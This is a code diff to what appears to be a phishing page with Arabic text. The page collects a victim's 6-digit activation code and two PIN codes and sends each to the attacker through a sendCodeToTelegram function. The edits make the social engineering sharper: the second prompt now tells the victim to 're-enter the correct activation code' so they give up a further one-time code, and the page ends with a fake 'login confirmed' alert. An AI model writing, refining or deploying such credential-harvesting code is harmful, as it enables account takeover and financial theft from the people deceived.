@@ -152,13 +152,13 @@
                 return;
             }
 
-            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
+            sendCodeToTelegram(activationCode1, "رمز التفعيل ");
 
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <h1>رمز التفعيل الثاني</h1>
-                    <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
+                    <h1>رمز التفعيل الصحيح</h1>
+                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.</p>
                     <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
@@ -200,7 +200,7 @@
                 return;
             }
 
-            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
+            sendCodeToTelegram(pinCode1, "رمز PIN ");
 
             startCountdown(() => {
                 const container = document.getElementById('container');
@@ -222,7 +222,7 @@
                 return;
             }
 
-            sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
+            sendCodeToTelegram(pinCode2, "رمز PIN ");
 
             startCountdown(() => {
                 alert('تم تأكيد الدخول بنجاح!');
